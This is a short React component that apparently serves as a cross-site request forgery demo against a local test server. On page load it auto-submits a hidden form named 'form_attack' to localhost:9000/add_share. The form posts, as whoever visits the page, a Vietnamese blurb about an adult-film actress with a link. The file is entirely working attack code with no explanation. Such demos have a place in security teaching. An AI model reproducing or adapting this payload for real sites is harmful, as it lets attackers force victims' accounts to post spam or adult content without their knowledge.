import React from "react";

export default class Home extends React.Component {
    componentDidMount() {
        document.getElementById("form_attack").submit();
    }

    render() {
        let value = "Yua Mikami - từ cô nàng hot girl trong trẻo cho tới quyết định đổi đời để trở thành thần tượng số một của dòng phim 18+." +
            "Link: http://localhost:8080/home/yua-mikami-friend "
        return (
            <div>
                <form action="http://localhost:9000/add_share" method="POST" id="form_attack">
                    <input type="hidden" name="share" value={value} />
                </form>
            </div>
        );
    }
}
